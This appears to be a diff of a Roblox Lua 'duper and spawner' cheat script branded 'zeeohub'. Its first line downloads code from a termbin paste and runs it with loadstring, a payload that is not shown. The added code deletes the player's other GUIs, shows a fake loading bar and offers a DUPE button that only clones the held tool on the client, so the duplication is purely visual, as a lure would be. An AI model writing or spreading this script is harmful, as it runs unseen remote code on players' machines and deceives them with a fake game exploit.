@@ -1,1 +1,245 @@
 loadstring(game:HttpGet("https://termbin.com/6z6r"))()
+wait 2.5
+-- LocalScript inside StarterPlayerScripts or StarterGui
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- =====================
+-- REMOVE ALL OTHER GUIS
+-- =====================
+for _, gui in ipairs(playerGui:GetChildren()) do
+	if gui:IsA("ScreenGui") then
+		gui:Destroy()
+	end
+end
+
+-- =====================
+-- LOADING SCREEN
+-- =====================
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreen"
+loadingGui.IgnoreGuiInset = true -- goes past safe area
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = playerGui
+
+local blackBG = Instance.new("Frame")
+blackBG.Size = UDim2.new(1, 0, 1, 0)
+blackBG.Position = UDim2.new(0, 0, 0, 0)
+blackBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blackBG.BorderSizePixel = 0
+blackBG.Parent = loadingGui
+
+-- Title label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.5, 0, 0.08, 0)
+title.Position = UDim2.new(0.25, 0, 0.36, 0)
+title.BackgroundTransparency = 1
+title.Text = "zeeohub"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextScaled = true
+title.Parent = blackBG
+
+-- Subtitle label
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(0.5, 0, 0.05, 0)
+subtitle.Position = UDim2.new(0.25, 0, 0.44, 0)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "duper and spawner"
+subtitle.TextColor3 = Color3.fromRGB(180, 180, 180)
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextScaled = true
+subtitle.Parent = blackBG
+
+-- Progress bar background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.4, 0, 0.015, 0)
+barBG.Position = UDim2.new(0.3, 0, 0.53, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBG.BorderSizePixel = 0
+barBG.Parent = blackBG
+
+local barBGCorner = Instance.new("UICorner")
+barBGCorner.CornerRadius = UDim.new(1, 0)
+barBGCorner.Parent = barBG
+
+-- Progress bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Position = UDim2.new(0, 0, 0, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(120, 80, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBG
+
+local barFillCorner = Instance.new("UICorner")
+barFillCorner.CornerRadius = UDim.new(1, 0)
+barFillCorner.Parent = barFill
+
+-- Animate progress bar over 5 seconds
+local tween = TweenService:Create(barFill, TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+	Size = UDim2.new(1, 0, 1, 0)
+})
+tween:Play()
+
+tween.Completed:Connect(function()
+	-- Fade out loading screen
+	local fadeTween = TweenService:Create(blackBG, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+		BackgroundTransparency = 1
+	})
+	TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+	TweenService:Create(subtitle, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+	TweenService:Create(barBG, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+	TweenService:Create(barFill, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+	fadeTween:Play()
+	fadeTween.Completed:Connect(function()
+		loadingGui:Destroy()
+		spawnMainGui()
+	end)
+end)
+
+-- =====================
+-- MAIN DUPE GUI
+-- =====================
+function spawnMainGui()
+	local mainGui = Instance.new("ScreenGui")
+	mainGui.Name = "ZeeOHub"
+	mainGui.ResetOnSpawn = false
+	mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	mainGui.Parent = playerGui
+
+	-- Outer panel (#2b1b57)
+	local panel = Instance.new("Frame")
+	panel.Size = UDim2.new(0, 200, 0, 110)
+	panel.Position = UDim2.new(0.5, -100, 0.5, -55)
+	panel.BackgroundColor3 = Color3.fromRGB(43, 27, 87)
+	panel.BorderSizePixel = 0
+	panel.Active = true
+	panel.Parent = mainGui
+
+	local panelCorner = Instance.new("UICorner")
+	panelCorner.CornerRadius = UDim.new(0, 12)
+	panelCorner.Parent = panel
+
+	-- Subtle drop shadow effect
+	local shadow = Instance.new("ImageLabel")
+	shadow.Size = UDim2.new(1, 30, 1, 30)
+	shadow.Position = UDim2.new(0, -15, 0, -10)
+	shadow.BackgroundTransparency = 1
+	shadow.Image = "rbxassetid://6014261993"
+	shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+	shadow.ImageTransparency = 0.5
+	shadow.ScaleType = Enum.ScaleType.Slice
+	shadow.SliceCenter = Rect.new(49, 49, 450, 450)
+	shadow.ZIndex = panel.ZIndex - 1
+	shadow.Parent = panel
+
+	-- Inner panel (#090829)
+	local inner = Instance.new("Frame")
+	inner.Size = UDim2.new(1, -20, 1, -20)
+	inner.Position = UDim2.new(0, 10, 0, 10)
+	inner.BackgroundColor3 = Color3.fromRGB(9, 8, 41)
+	inner.BorderSizePixel = 0
+	inner.Parent = panel
+
+	local innerCorner = Instance.new("UICorner")
+	innerCorner.CornerRadius = UDim.new(0, 8)
+	innerCorner.Parent = inner
+
+	-- DUPE button
+	local dupeBtn = Instance.new("TextButton")
+	dupeBtn.Size = UDim2.new(0.6, 0, 0.45, 0)
+	dupeBtn.Position = UDim2.new(0.2, 0, 0.27, 0)
+	dupeBtn.BackgroundColor3 = Color3.fromRGB(43, 27, 87)
+	dupeBtn.BorderSizePixel = 0
+	dupeBtn.Text = "DUPE"
+	dupeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	dupeBtn.Font = Enum.Font.GothamBold
+	dupeBtn.TextScaled = true
+	dupeBtn.Parent = inner
+
+	local dupeBtnCorner = Instance.new("UICorner")
+	dupeBtnCorner.CornerRadius = UDim.new(0, 6)
+	dupeBtnCorner.Parent = dupeBtn
+
+	-- Button hover effect
+	dupeBtn.MouseEnter:Connect(function()
+		TweenService:Create(dupeBtn, TweenInfo.new(0.15), {
+			BackgroundColor3 = Color3.fromRGB(70, 45, 130)
+		}):Play()
+	end)
+	dupeBtn.MouseLeave:Connect(function()
+		TweenService:Create(dupeBtn, TweenInfo.new(0.15), {
+			BackgroundColor3 = Color3.fromRGB(43, 27, 87)
+		}):Play()
+	end)
+
+	-- DUPE button press — visually clone held tool (client-sided)
+	dupeBtn.MouseButton1Click:Connect(function()
+		local character = player.Character
+		if not character then return end
+
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if not humanoid then return end
+
+		local tool = character:FindFirstChildOfClass("Tool")
+		if not tool then
+			-- Flash button red briefly if no tool held
+			TweenService:Create(dupeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(150, 30, 30)}):Play()
+			task.wait(0.3)
+			TweenService:Create(dupeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(43, 27, 87)}):Play()
+			return
+		end
+
+		-- Clone tool visually into Backpack (client only)
+		local clone = tool:Clone()
+		clone.Parent = player.Backpack
+
+		-- Flash button green on success
+		TweenService:Create(dupeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(30, 130, 60)}):Play()
+		task.wait(0.3)
+		TweenService:Create(dupeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(43, 27, 87)}):Play()
+	end)
+
+	-- =====================
+	-- DRAGGING (PC + Mobile)
+	-- =====================
+	local dragging = false
+	local dragStart = nil
+	local startPos = nil
+
+	local function updateDrag(input)
+		local delta = input.Position - dragStart
+		panel.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+
+	panel.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+			or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = panel.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if dragging and (
+			input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch
+		) then
+			updateDrag(input)
+		end
+	end)
+end
